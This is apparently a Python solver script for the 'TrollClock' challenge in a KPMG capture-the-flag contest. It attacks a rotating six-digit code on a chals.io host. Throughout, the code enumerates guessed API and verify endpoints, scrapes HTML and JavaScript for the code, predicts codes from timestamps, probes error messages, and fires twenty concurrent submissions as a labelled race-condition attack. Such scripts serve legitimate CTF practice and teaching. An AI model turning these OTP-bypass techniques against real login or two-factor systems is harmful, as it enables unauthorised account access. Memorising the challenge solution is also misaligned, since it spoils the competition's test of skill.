#!/usr/bin/env python3
"""
TrollClock CTF Challenge Solver
KPMG KICyber CTF 2025

The challenge presents a 6-digit code that refreshes every 10 seconds.
A new challenge is issued every 37 seconds.
Hint: "You start with errors and you learn to live with it"

Likely vulnerability: The OTP is either:
1. Fetched from a server-side API endpoint (most common CTF pattern)
2. Generated client-side from a predictable timestamp seed
3. Has a timing window where old/adjacent codes are still accepted

Strategy:
- Step 1: Load the page, extract session cookie
- Step 2: Find how the OTP is obtained (API endpoint or JS logic)
- Step 3: Fetch the current OTP and immediately submit it
- Step 4: If timing attack is needed, try codes from adjacent time windows
"""

import requests
import time
import re
import threading
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

BASE_URL = "http://kicyber-00c797b2c34e-trollclock-0-0.chals.io"

session = requests.Session()

def get_page_and_extract_code():
    """Load the main page and try to extract OTP from HTML/JS"""
    resp = session.get(BASE_URL, timeout=10)
    print(f"[*] Page status: {resp.status_code}")

    # Look for a code in the HTML (common CTF pattern)
    # e.g., data-code="123456" or var code = "123456"
    patterns = [
        r'data-code["\s]*[:=]["\s]*["\']?(\d{6})',
        r'var\s+code\s*=\s*["\'](\d{6})',
        r'"code"\s*:\s*"?(\d{6})',
        r'otp["\s]*[:=]["\s]*["\']?(\d{6})',
        r'token["\s]*[:=]["\s]*["\']?(\d{6})',
        r'>(\d{6})<',  # code displayed in element
    ]

    for p in patterns:
        m = re.search(p, resp.text, re.IGNORECASE)
        if m:
            print(f"[+] Found code in HTML: {m.group(1)}")
            return m.group(1), resp.cookies

    print("[*] Code not found directly in HTML. Checking for JS files...")

    # Extract JS file URLs — only fetch from the same host to prevent SSRF
    base_host = urlparse(BASE_URL).netloc
    js_files = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', resp.text)
    for js_url in js_files:
        if not js_url.startswith('http'):
            js_url = BASE_URL + '/' + js_url.lstrip('/')
        if urlparse(js_url).netloc != base_host:
            continue
        print(f"[*] Checking JS: {js_url}")
        js_resp = session.get(js_url, timeout=10)
        for p in patterns:
            m = re.search(p, js_resp.text, re.IGNORECASE)
            if m:
                print(f"[+] Found code in JS: {m.group(1)}")
                return m.group(1), resp.cookies

    return None, resp.cookies


def try_api_endpoints():
    """Try common API endpoints to get the current code"""
    endpoints = [
        "/api/code",
        "/api/otp",
        "/api/token",
        "/code",
        "/otp",
        "/get_code",
        "/challenge",
        "/api/challenge",
        "/api/current_code",
    ]

    for ep in endpoints:
        try:
            r = session.get(BASE_URL + ep, timeout=5)
            if r.status_code == 200:
                print(f"[+] API endpoint found: {ep}")
                print(f"    Response: {r.text[:200]}")

                # Try to extract 6-digit code from response
                m = re.search(r'\b(\d{6})\b', r.text)
                if m:
                    return m.group(1), ep

                # Try JSON
                try:
                    data = r.json()
                    for key in ['code', 'otp', 'token', 'value']:
                        if key in data:
                            return str(data[key]), ep
                except:
                    pass
        except:
            pass

    return None, None


def verify_code(code, extra_info=None):
    """Submit the code to verify endpoint"""
    # Common submit endpoints
    endpoints = ["/verify", "/submit", "/check", "/validate", "/api/verify"]

    for ep in endpoints:
        try:
            # Try POST with form data
            r = session.post(BASE_URL + ep,
                           data={"code": code},
                           timeout=10,
                           allow_redirects=True)

            if r.status_code in [200, 302]:
                text = r.text.lower()
                if any(kw in text for kw in ['flag', 'kpmg_ctf', 'correct', 'success', 'congratulation']):
                    print(f"[!!!] FLAG FOUND via POST to {ep}!")
                    # Extract flag
                    flag_match = re.search(r'KPMG_CTF\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        return flag_match.group(0)
                    return r.text

            # Try POST with JSON
            r = session.post(BASE_URL + ep,
                           json={"code": code},
                           timeout=10,
                           allow_redirects=True)

            if r.status_code in [200, 302]:
                text = r.text.lower()
                if any(kw in text for kw in ['flag', 'kpmg_ctf', 'correct', 'success']):
                    print(f"[!!!] FLAG FOUND via JSON POST to {ep}!")
                    flag_match = re.search(r'KPMG_CTF\{[^}]+\}', r.text, re.IGNORECASE)
                    if flag_match:
                        return flag_match.group(0)
                    return r.text

        except Exception as e:
            pass

    return None


def predict_code_from_timestamp():
    """
    Try common timestamp-based code generation patterns.
    If the code is predictable from time, we can submit it directly.
    """
    t = int(time.time())

    candidates = [
        t % 1000000,                          # unix timestamp mod 1M
        (t // 10) % 1000000,                  # changes every 10s
        int(hashlib.sha256(str(t // 10).encode()).hexdigest()[:6], 16) % 1000000,
        int(hashlib.sha256(str(t // 37).encode()).hexdigest()[:6], 16) % 1000000,
        (t // 37) % 1000000,                  # changes every 37s (challenge window)
    ]

    return [f"{c:06d}" for c in candidates]


def race_condition_attack():
    """
    Race condition: send many requests concurrently to hit the code
    during the transition window between old and new codes.

    This works if the server has a brief window where both old and new
    codes are accepted (clock skew tolerance).
    """
    print("[*] Attempting race condition attack...")

    # Get the current code from the page first
    code, cookies = get_page_and_extract_code()
    if not code:
        print("[!] Could not extract code from page")
        return None

    print(f"[*] Current code: {code}")

    results = []

    def attempt(c):
        return verify_code(c)

    # Try current code and adjacent codes (in case of TOTP-style tolerance)
    # with parallel requests to maximize chances during transition
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(attempt, code) for _ in range(20)]
        for f in as_completed(futures):
            result = f.result()
            if result:
                return result

    return None


def timing_attack_on_error_messages():
    """
    The hint 'You start with errors and you learn to live with it'
    suggests examining error responses carefully.

    Some servers leak timing information or code hints in error messages.
    """
    print("[*] Probing error messages for hints...")

    test_cases = [
        "",           # empty
        "000000",     # all zeros
        "abc123",     # invalid format
        None,         # missing parameter
    ]

    for tc in test_cases:
        try:
            if tc is None:
                r = session.post(BASE_URL + "/verify", data={}, timeout=5)
            else:
                r = session.post(BASE_URL + "/verify", data={"code": tc}, timeout=5)

            print(f"  Input={repr(tc)}: status={r.status_code}, body={r.text[:200]}")

            # Look for any code hints in error response
            m = re.search(r'\b(\d{6})\b', r.text)
            if m:
                print(f"[!!!] Potential code in error response: {m.group(1)}")
                return m.group(1)
        except Exception as e:
            print(f"  Error: {e}")

    return None


def main():
    print("=" * 60)
    print("TrollClock CTF Solver")
    print(f"Target: {BASE_URL}")
    print("=" * 60)

    # Step 1: Probe for error message hints
    code_from_error = timing_attack_on_error_messages()
    if code_from_error:
        result = verify_code(code_from_error)
        if result:
            print(f"\n[FLAG] {result}")
            return

    # Step 2: Try API endpoints
    print("\n[*] Checking API endpoints...")
    api_code, ep = try_api_endpoints()
    if api_code:
        print(f"[+] Got code {api_code} from {ep}")
        result = verify_code(api_code)
        if result:
            print(f"\n[FLAG] {result}")
            return

    # Step 3: Extract from page source
    print("\n[*] Extracting code from page...")
    page_code, cookies = get_page_and_extract_code()
    if page_code:
        result = verify_code(page_code)
        if result:
            print(f"\n[FLAG] {result}")
            return

    # Step 4: Try timestamp-based prediction
    print("\n[*] Trying timestamp-based code prediction...")
    candidates = predict_code_from_timestamp()
    for c in candidates:
        print(f"[*] Trying predicted code: {c}")
        result = verify_code(c)
        if result:
            print(f"\n[FLAG] {result}")
            return

    # Step 5: Race condition attack
    print("\n[*] Trying race condition attack...")
    result = race_condition_attack()
    if result:
        print(f"\n[FLAG] {result}")
        return

    print("\n[!] Could not solve challenge automatically.")
    print("    The challenge instance may be offline.")
    print("    Manual analysis of the page source required.")


if __name__ == "__main__":
    main()
